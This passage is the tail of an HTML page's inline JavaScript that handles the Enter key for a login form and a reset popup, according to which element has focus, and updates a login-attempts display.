                if (document.activeElement && resetPopup.contains(document.activeElement)) {
                    resetCounter();
                } else if (document.activeElement === document.body) { // If nothing specific is focused, but popup is open
                     resetCounter();
                }
            } else if (loginBox && loginBox.style.display === 'block') {
                 // If main login box is active and visible
                // And we're not inside a text area which may handle Enter differently (e.g. multi-line input not used here, but good practice)
                if (document.activeElement && (document.activeElement === usernameInput || document.activeElement === passwordInput || document.activeElement === userIDInput || document.activeElement === submitBtn)) {
                    submitLogin();
                } else if (document.activeElement === document.body) { // If nothing specific is focused, assume main form submit
                    submitLogin();
                }
            }
        }
      });

      // Initial display update for attempts count
      updateAttemptsText();
    })();
  </script>
</body>
</html>
